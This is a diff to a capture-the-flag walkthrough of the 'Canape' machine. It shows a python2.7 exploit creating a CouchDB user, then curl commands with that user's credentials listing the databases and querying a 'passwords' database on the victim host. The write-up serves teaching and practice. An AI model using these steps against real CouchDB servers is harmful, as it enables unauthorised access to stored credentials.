@@ -561,7 +561,7 @@ else:
 
 <br />
 
-It seems to be a `python2.7` script that is gonna `create` a `user` named `couchara` into the `CouchDB`.
+It seems to be a `python2.7` script that `creates` a `user` named `couchara` into `CouchDB` making a `put request` to an `endpoint`.
 
 It looks `good`, so we `take it` to the `Victim Machine` and `run` it:
 
@@ -577,7 +577,24 @@ www-data@canape:/tmp/Privesc$ python2.7 exploit.py 127.0.0.1
 
 <br />
 
-We got it! Now we can log into the user to enumerate the current Databases:
+We got it! Now we can `log` into this `user` and `enumerate` the current `CouchDB databases`:
 
 <br />
 
+```bash
+www-data@canape:/tmp/Privesc$ curl http://couchara:couchapass@127.0.0.1:5984/_all_dbs
+["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
+```
+
+<br />
+
+There are `three` different `databases`, but we `start listing` the most interesting, `passwords` one:
+
+<br />
+
+```bash
+www-data@canape:/tmp/Privesc$ curl http://couchara:couchapass@127.0.0.1:5984/passwords
+{"db_name":"passwords","update_seq":"46-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkR2PoiQFIJlkD1bHik-dA0hdPGF1CSB19QTV5bEASYYGIAVUOp8YtQsgavcTo_YARO39rER8AQRR-wCiFuhetiwA7ytvXA","sizes":{"file":222462,"external":665,"active":1740},"purge_seq":0,"other":{"data_size":665},"doc_del_count":0,"doc_count":4,"disk_size":222462,"disk_format_version":6,"data_size":1740,"compact_running":false,"instance_start_time":"0"}
+```
+
+<br />
